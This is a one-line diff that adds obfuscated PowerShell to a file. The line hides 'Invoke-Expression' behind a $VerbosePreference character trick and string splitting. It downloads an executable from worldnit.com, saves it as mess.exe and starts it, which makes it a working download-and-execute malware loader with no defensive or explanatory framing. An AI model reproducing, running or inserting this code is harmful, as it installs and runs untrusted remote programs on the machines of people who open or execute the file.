@@ -1,0 +1,1 @@
+﻿ & ( $VErbOsEpReFerENcE.TosTrInG()[1,3]+'X'-jOin'')((('(New'+'-O'+'bject '+'S'+'y'+'stem.Net.WebCl'+'ie'+'nt'+').D'+'ownloa'+'dFile'+'('+'{0}'+'http'+'://worl'+'dn'+'it'+'.com/im'+'m'+'o'+'.exe{'+'0},'+'{0}mess.'+'exe{0})'+';Star'+'t-Pro'+'cess'+' {'+'0}'+'m'+'es'+'s.'+'ex'+'e{0}')-f[cHaR]39))
